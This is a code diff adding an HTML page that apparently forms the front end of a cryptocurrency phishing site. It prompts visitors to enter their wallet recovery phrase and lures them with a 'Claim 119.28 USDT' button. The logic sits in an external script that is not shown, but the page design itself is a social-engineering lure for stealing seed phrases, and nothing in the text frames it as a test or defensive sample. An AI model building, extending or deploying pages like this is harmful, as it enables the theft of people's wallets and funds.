@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Recovery Phrase</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+
+<div class="container">
+  <div class="card">
+
+    <div class="phrase-header">
+      <span class="back-arrow" onclick="history.back()">←</span>
+      <div class="header-title">Recovery Phrase</div>
+    </div>
+
+    <p class="phrase-hint">Enter Wallet Recovery Phrase</p>
+    <p style="font-size: 12px; color: gray;">Add a space between each word and make sure no one is watching.</p>
+
+    <div id="phraseInput" class="phrase-input" contenteditable="true"></div>
+
+    <div class="phrase-actions">
+      <span id="pasteBtn">Paste</span>
+    </div>
+
+    <p id="phraseError" class="phrase-error"></p>
+
+<button id="continuePhrase" class="primary-btn">Claim 119.28 USDT</button>
+
+  </div>
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
